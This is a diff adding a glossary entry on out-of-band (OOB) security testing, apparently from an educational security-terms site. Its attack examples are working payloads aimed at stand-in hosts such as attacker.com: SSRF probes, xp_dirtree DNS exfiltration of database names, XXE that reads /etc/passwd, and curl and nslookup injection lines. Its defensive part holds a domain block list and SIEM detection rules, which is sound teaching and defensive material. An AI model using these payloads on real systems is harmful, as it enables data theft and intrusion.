@@ -1,0 +1,233 @@
+---
+slug: "out-of-band"
+term: "Out-of-Band"
+abbreviation: "OOB"
+shortDefinition: "A technique where data is transmitted through a separate channel from the main communication. In security testing, it means getting confirmation of an exploit through external means (like a DNS request or HTTP callback)."
+category: "Attack Techniques"
+tags: ["oob", "ssrf", "blind", "exfiltration", "testing"]
+relatedTerms: ["blind-ssrf", "dns-log", "vps", "ssrf"]
+language: "en"
+hasTranslation: true
+translationSlug: "out-of-band"
+difficulty: "intermediate"
+lastUpdated: "2026-02-26"
+sources:
+  - "https://portswigger.net/burp/documentation/desktop/tools/collaborator"
+---
+
+## Short Definition
+Out-of-band (OOB) is when you can't see the result directly, so you use a side channel. Like if you can't hear someone's answer in a noisy room, you ask them to text you instead. In hacking, it's making the target contact your server, proving the exploit worked.
+
+## Full Definition
+Out-of-band communication in security testing refers to using an alternate channel to confirm or exfiltrate data when direct response isn't visible.
+
+**Key concept:**
+- **In-band**: Response comes back through same channel
+- **Out-of-band**: Response comes through different channel
+
+**Common OOB channels:**
+- DNS queries
+- HTTP/HTTPS requests
+- SMTP (email)
+- FTP connections
+- ICMP (ping)
+
+**Why needed:**
+- Blind vulnerabilities (no direct output)
+- Filtered responses
+- Time delays hide results
+- Confirm exploitation without seeing output
+
+**Infrastructure:**
+- Personal VPS
+- Burp Collaborator
+- interactsh
+- Custom callback servers
+- DNS logging services
+
+## Why It Matters
+- Proves blind vulnerabilities exist
+- Exfiltrates data when direct extraction blocked
+- Bypasses filtering and WAFs
+- Essential for blind SSRF, XXE, SQLi
+- Distinguishes false positives from real vulnerabilities
+
+## How Attackers Use It (and Ethical Testing)
+**Blind SSRF detection:**
+
+```python
+# Can't see response, use OOB
+payload = "http://unique-id.attacker-vps.com"
+
+POST /api/fetch-url
+{"url": payload}
+
+# Server makes request → OOB server logs it
+# Proof of SSRF even without seeing response
+```
+
+**Blind SQL Injection:**
+
+```sql
+-- Can't see query results, use OOB
+'; EXEC master..xp_dirtree '\\unique-id.attacker.com\share';--
+
+-- If vulnerable, server makes DNS lookup to attacker.com
+-- DNS logs confirm SQL injection
+```
+
+**XXE (XML External Entity) OOB:**
+
+```xml
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "http://unique-id.attacker.com/data">
+]>
+&xxe;
+
+
+
+```
+
+**Data exfiltration via OOB:**
+
+```sql
+-- Exfiltrate database name
+'; DECLARE @data varchar(max);
+SELECT @data = DB_NAME();
+EXEC('master..xp_dirtree "\\' + @data + '.attacker.com\share"');--
+
+-- DNS query: databasename.attacker.com
+-- Attacker sees database name in DNS logs
+```
+
+**Blind command injection:**
+
+```bash
+; nslookup unique-id.attacker.com
+; curl http://unique-id.attacker.com
+; ping -c1 unique-id.attacker.com
+```
+
+## How to Detect or Prevent It
+**Prevention:**
+
+**Network level:**
+- Block outbound DNS to non-org servers
+- Restrict HTTP/HTTPS egress
+- Monitor and alert on unusual outbound connections
+- Use DNS filtering
+- Implement egress proxies
+
+**Application level:**
+```python
+# Block private IPs and suspicious domains
+BLOCKED_DOMAINS = [
+  'burpcollaborator.net',
+  'interact.sh',
+  'oast.pro',
+  'oast.fun'
+]
+
+def validate_url(url):
+    parsed = urlparse(url)
+    
+    # Block known OOB services
+    if any(blocked in parsed.hostname for blocked in BLOCKED_DOMAINS):
+        return False
+    
+    # Resolve and block private IPs
+    ip = socket.gethostbyname(parsed.hostname)
+    if is_private_ip(ip):
+        return False
+    
+    return True
+```
+
+**Detection:**
+
+**Monitor for:**
+- Outbound DNS to unknown domains
+- HTTP requests to suspicious domains
+- Encoded data in DNS queries
+- Pattern: many requests to same unknown domain
+- Requests with unique subdomains
+
+**Example suspicious pattern:**
+```
+abc123.attacker.com
+def456.attacker.com
+ghi789.attacker.com
+# Sequential unique IDs = likely OOB testing
+```
+
+**SIEM rules:**
+```
+Alert if:
+  - Outbound DNS query to *.burpcollaborator.net
+  - Outbound DNS with > 30 character subdomain
+  - Multiple hosts querying same unusual domain
+  - DNS query contains base64/hex patterns
+```
+
+## Common Misconceptions
+- "No response = no vulnerability" - OOB can still prove it
+- "Blocking HTTP blocks OOB" - DNS still works
+- "OOB only for advanced attacks" - Basic technique, widely used
+- "Can't exfiltrate much data" - Can encode significant data in DNS
+- "WAF blocks OOB" - OOB bypasses most WAFs
+
+## Real-World Example
+**Blind SQLi via DNS OOB (Real Pentest)**
+
+```sql
+-- Target: Banking application
+-- Vulnerability: Blind SQL injection
+-- No error messages, no visible output
+
+-- Step 1: Confirm injection
+id=1'; WAITFOR DELAY '00:00:10'--
+-- Page takes 10 seconds → SQLi confirmed
+
+-- Step 2: Exfiltrate data via DNS
+id=1'; 
+DECLARE @data VARCHAR(max);
+SELECT @data = name FROM sys.databases WHERE database_id = 1;
+EXEC('master..xp_dirtree "\\' + @data + '.attacker-domain.com\a"');--
+
+-- DNS log shows: master.attacker-domain.com
+-- Database name extracted without direct output!
+```
+
+**XXE Blind Data Exfiltration**
+
+```xml
+
+
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+  %send;
+]>
+&trigger;
+```
+
+```xml
+
+<!ENTITY % send "<!ENTITY trigger SYSTEM 'http://attacker.com/?data=%file;'>">
+```
+
+Result: `/etc/passwd` contents sent to attacker.com via HTTP.
+
+**Blind SSRF in Capital One**
+
+While initial SSRF wasn't completely blind, attacker used OOB techniques to:
+1. Confirm metadata service accessibility
+2. Verify different endpoint responses
+3. Test credential validity
+4. Map internal network
+
+Even if direct response was filtered, OOB would have worked.
+
+## Related Terms
+Blind SSRF, DNS Log, VPS, SSRF, XXE
